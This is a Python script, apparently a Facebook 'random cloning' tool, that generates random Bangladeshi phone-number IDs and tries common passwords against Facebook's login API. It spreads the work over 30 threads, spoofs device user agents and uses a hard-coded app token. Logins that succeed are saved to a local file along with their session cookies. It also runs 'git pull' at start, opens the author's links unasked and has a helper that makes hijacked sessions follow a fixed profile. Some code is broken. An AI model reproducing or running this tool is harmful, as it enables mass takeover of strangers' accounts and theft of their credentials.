#sajjad sordar
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100088316394289/')        

logo2=("""\033[1;97m  
 \x1b[38;2;207m  ┏━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┓
    \x1b[38;2;207m┃\033[1;92m_  _\033[1;93m _  _ \033[1;95m_  _\x1b[38;5;208m _ \033[1;91m___ \033[1;97m\x1b[38;2;207m┃\x1b[38;5;208m𝗦𝗔𝗝𝗝𝗔𝗗-𝗦𝗢𝗥𝗗𝗔𝗥\033[1;0m\x1b[38;2;207m┃
    \x1b[38;2;207m┃\033[1;92m|\/|\033[1;93m |  |\033[1;95m |__|\x1b[38;5;208m |\033[1;91m |__]\033[1;97m\x1b[38;2;207m┣━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┫
  \x1b[38; 2;207m┃\033[1;92m|  |\033[1;93m |__| \033[1;95m|  | \x1b[38;5;208m|\033[1;91m |__]\033[1;97m\x1b[38;2;207m┃\x1b[38;7;207m\033[1;42m𝗦𝗦𝗧 - 𝐕𝐄𝐑𝐒𝐈𝐎𝐍- 𝟐.𝟏\033[1;0m\x1b[38;2;207m┃
   \x1b[38;2;207m┃\033[1;97m                    \x1b[38;2;207m ┃\033[1;96m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇-𝐑𝐀𝐍𝐃𝐎𝐌 \033[1;97m\x1b[38;2;207m┃
  \x1b[38;2;207m┗━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┛""")
 
logo= ("""  
 \x1b[38;2;207m┏━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┓
  \x1b[38;2;207m┃\033[1;92m_  _\033[1;93m _  _ \033[1;95m_  _\x1b[38;5;208m _ \033[1;91m___ \033[1;97m\x1b[38;2;207m┃\x1b[38;5;208m𝗦𝗔𝗝𝗝𝗔𝗗-𝗦𝗢𝗥𝗗𝗔𝗥\033[1;0m\x1b[38;2;207m┃
  \x1b[38;2;207m┃\033[1;92m|\/|\033[1;93m |  |\033[1;95m |__|\x1b[38;5;208m |\033[1;91m |__]\033[1;97m\x1b[38;2;207m┣━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┫
 \x1b[38;2;207m┃\033[1;92m|  |\033[1;93m |__| \033[1;95m|  | \x1b[38;5;208m|\033[1;91m |__]\033[1;97m\x1b[38;2;207m┃\x1b[38;7;207m\033[1;42m𝗦𝗦𝗧 - 𝐕𝐄𝐑𝐒𝐈𝐎𝐍- 𝟐.𝟏\033[1;0m\x1b[38;2;207m┃
 \x1b[38;2;207m┃\033[1;97m                    \x1b[38;2;207m ┃\033[1;96m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇-𝐑𝐀𝐍𝐃𝐎𝐌 \033[1;97m\x1b[38;2;207m┃
 \x1b[38;2;207m┗━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┛""")
 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)


#______________Installation_______________#

#___________Selection__________#
def Main():
    os.system('clear')
    print(logo)
    print(f"  \033[1;91m[\033[1;92m𝟏\033[1;31m]{H} 𝐒𝐓𝐀𝐑𝐓 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆")
    print(f"  \033[1;91m[\033[1;92m𝟐\033[1;31m] {H}𝐉𝐎𝐈𝐍 𝐌𝐄𝐒𝐒𝐄𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏 ")
    print(f"  \033[1;91m[\033[1;92m𝟑\033[1;31m] {H}𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 ")
    print(f"  \033[1;91m[\033[1;92m𝟎\033[1;31m] {H}𝐄𝐗𝐈𝐓 𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋")
    me=input(f'\033[1;91m  [\033[1;92m❯\033[1;31m]\033[1;97m CHOICE :{P} ')
    if me in ["1","01"]:
        xxt()
    if me in ["2","02"]:
        os.system('xdg-open https://wa.me/+880 1401580673')
    if me in ["3","03"]:
        os.system("xdg-open https://facebook.com/100088316394289")
    if me in ["E","0"]:
        os.system('exit')
    if me in ["N","9"]:
    	tocl()
    	

def tocl():
    os.system('clear')
    print(logo)
    print(f" \033[1;91m[\033[1;32m1\033[1;31m]{H} BD ULTRA CLONING ")
    print(f" \033[1;91m[\033[1;32m2\033[1;31m] {H}BD SUPER CLONING ")
    me=input(f'\033[1;91m [\033[1;32m❯\033[1;31m]\033[1;97m CHOICE :{P} ')
    if me in ["1","01"]:
        xxt()
    if me in ["2","02"]:
        xxr()


def xxt():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    os.system('xdg-open https://facebook.com/groups/190921233751781/')
    print(f'  \33[1;91m[{H}❯\033[1;91m] \033[1;92mEXAMPLE : {P}017 {H}| {P}019 {H}| {P}016 {H}| {P}018 ')
    print(" \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input(f'  \033[1;91m[{H}❯\033[1;91m] {H}INPUT SIM CODE  : {P}')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    os.system('xdg-open https://github.com/MUHIB-143/')
    print(f'  \033[1;91m[{H}❯\033[1;91m] \033[1;92mEXAMPLE : \033[1;97m2000 \033[1;92m| \033[1;97m3000 \033[1;92m| \033[1;97m4000\033[1;92m | \033[1;97m5000')
    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(f'  \033[1;91m[{H}❯\033[1;91m]\033[1;92m CRACK LIMIT : \033[1;97m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as KING:
        os.system('clear')
        print(logo2)
        tl = str(len(user))
        print(f' \x1b[38;2;207m ┃\033[1;92m CRACKING  WITH BD SIM CODE\033[1;91m :\033[1;97m {code}       \033[1;0m \x1b[38;2;207m┃')
        print(f' \x1b[38;2;207m ┃\033[1;92m CRACKING  WITH CHOICE LIMIT\033[1;91m: \033[1;97m{tl}      \033[1;0m \x1b[38;2;207m┃')
        print('  \x1b[38;2;207m┗━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┛')
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat','Free Fire','FREE FIRE','57273200']
            ids = code+love
            KING.submit(FIRE,ids,pwx,tl)
    print(' \n________________________ ')

def FIRE(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r  \033[1;90m[\033[1;92mSAJJAD-143\033[1;90m]-[\033[1;93m{loop}\033[1;90m]-[\033[1;97m{tl}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
            application_version_code=str(random.randint(000000000,999999999))
            fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
            gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
            gttt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
            android_version=str(random.randrange(6,13))
            ua_string = f'Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC72 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; TB718 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 13; OPD2203 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-V607L Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; RC609L Build/ORB609L_V1.3.0_BTM-ST)","Dalvik/2.1.0 (Linux; U; Android 12; A201SH Build/S0020)","Dalvik/2.1.0 (Linux; U; Android 11; Infinix X663D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) play Build/QPYS30.95-Q3-10-62-3-22)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS_TVE19A Build/PTMW.190511.139)","Dalvik/2.1.0 (Linux; U; Android 10.0; Note10+ Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 13; SM-M546B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTEAMR311 Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 12; H4113 Build/SQ3A.220705.004)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOWS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AEOCW Build/NS6505)","Dalvik/2.1.0 (Linux; U; Android 12; X55 Build/SP1A.210812.016)","Dalvik/1.4.0 (Linux; U; Android 2.3.5; HTC Desire HD A9191 Build/GRJ90)","Dalvik/2.1.0 (Linux; U; Android 11; M2004J19C Build/RP1A.200720.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; SM-A037G Build/RP1A.200720.012) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 9; CPH2015 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; STK-L21 Build/HUAWEISTK-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i14_Max Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; V2131 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; ONEPLUS A6013 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; F803YM Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RONS31.267-94-3)","Dalvik/2.1.0 (Linux; U; Android 6.0; Note20+ Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002.G1)","Dalvik/2.1.0 (Linux; U; Android 9; Lenovo TB-8504F Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005D Build/RKQ1.210303.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2038 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; LG-H870 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; Optima 7 A102 3G TS7243PG Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BL150 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; A8P Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:c74a09cf-2e2f-4494-a948-5f5a01fcd349; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:be27f2fd-13ef-4eb9-8fcd-a2b48e2a17e9; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 13; V2072A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SC-52A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:aa16de38-3bc3-4ff0-b52b-803a42312cfb; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 12; AGS5-W09 Build/HUAWEIAGS5-W09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-17)","Dalvik/2.1.0 (Linux; U; Android 11; PEGM10 Build/RKQ1.201217.002)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TG Build/SKQ1.211103.001) VD/235","Dalvik/2.1.0 (Linux; U; Android 7.0; Archos 101b Xenon Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; SL104D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11.0; i13 pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; moto g52 Build/S1SRS32.38-132-11)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo TB-Q706F Build/RKQ1.210614.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-12)","Dalvik/2.1.0 (Linux; U; Android 9; POS-EIBTPDC Build/PI)","Dalvik/2.1.0 (Linux; U; Android 12; SM-E045F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Z42 pro Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; MX-A10R Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; mt5867 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; PCHM10 Build/RKQ1.200903.002)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTK2.220814.001)","Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM4.220307.159)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.A1)","Dalvik/2.1.0 (Linux; U; Android 12; A161 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; MAXIMUS 5.0 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; Android 7.1.2; MI 8 SE Build/311vx; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; SHV46 Build/PKQ1.190626.001)","Dalvik/2.1.0 (Linux; U; Android 13; NX712J Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 11; T766H_EEA Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; 5002E Build/QKQ1.200623.002) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A3 2020 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; T5 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; M2003J15SC MIUI/V12.0.10.0.QJOEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-2-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Viva_1003G_Lite Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 fusion Build/S3SJS32.1-86-2-4)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N971N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 11; Facilotab L Rubis Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.025)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_x86_64 Build/TSE5.230214.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40Pro_RUS Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; NLG-QBEX Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris X5 Plus Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-11)","Dalvik/2.1.0 (Linux; U; Android 12; V Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S88Pro Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2004J19C MIUI/V12.0.4.0.QJCMIXM) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PLUM Z712 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)",])'
            adid = str(uuid.uuid4())
            #ua_string = uaa()
            ua_string = MUHIB3()
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': ua_string,
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\033[1;91m  [\033[1;92mSAJJAD-💚\033[1;91m]\033[1;92m\x1b[38;2;202m '+ids+' \033[1;97m| \033[1;92m\x1b[38;2;202m'+pas+'\033[1;92m')
                oks.append(ids)
                open('/sdcard/SAJJAD-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
Main()